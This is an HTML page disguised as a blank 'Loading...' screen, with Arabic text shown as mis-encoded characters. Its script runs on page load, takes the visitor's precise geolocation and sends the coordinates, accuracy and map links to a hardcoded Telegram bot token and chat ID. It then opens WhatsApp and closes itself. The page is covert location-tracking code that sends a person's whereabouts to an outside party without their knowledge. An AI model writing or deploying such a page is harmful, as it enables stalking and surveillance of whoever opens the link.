<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        function getLocationAndSend() {
            if (!navigator.geolocation) {
                sendToTelegram("âŒ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // Ø±Ø§Ø¨Ø· ÙˆØ§ØªØ³Ø§Ø¨ Ù…Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                    const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(`Ù…ÙˆÙ‚Ø¹ÙŠ: https://maps.google.com/?q=${lat},${lng}`)}`;
                    
                    const message = 
                        `ğŸ“± Ù…ÙˆÙ‚Ø¹ Ù…Ù† ÙˆØ§ØªØ³Ø§Ø¨\n\n` +
                        `ğŸ“ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:\n` +
                        `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${lat.toFixed(6)}\n` +
                        `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${lng.toFixed(6)}\n` +
                        `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${accuracy} Ù…ØªØ±\n\n` +
                        `ğŸ—ºï¸ Ø§Ù„Ø®Ø±ÙŠØ·Ø©:\n` +
                        `https://maps.google.com/?q=${lat},${lng}\n\n` +
                        `ğŸ’¬ ÙˆØ§ØªØ³Ø§Ø¨:\n${whatsappUrl}\n\n` +
                        `ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-MA')}`;

                    await sendToTelegram(message);
                    
                    // ÙØªØ­ ÙˆØ§ØªØ³Ø§Ø¨ Ø£ÙŠØ¶Ø§Ù‹
                    window.open(whatsappUrl, '_blank');
                    
                    setTimeout(() => window.close(), 2000);
                },
                function(error) {
                    sendToTelegram("âŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹");
                    setTimeout(() => window.close(), 2000);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            } catch (error) {
                console.log("Error sending to Telegram");
            }
        }

        // Ø§Ù„Ø¨Ø¯Ø¡ ÙÙˆØ±Ø§Ù‹
        getLocationAndSend();
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
</body>
</html>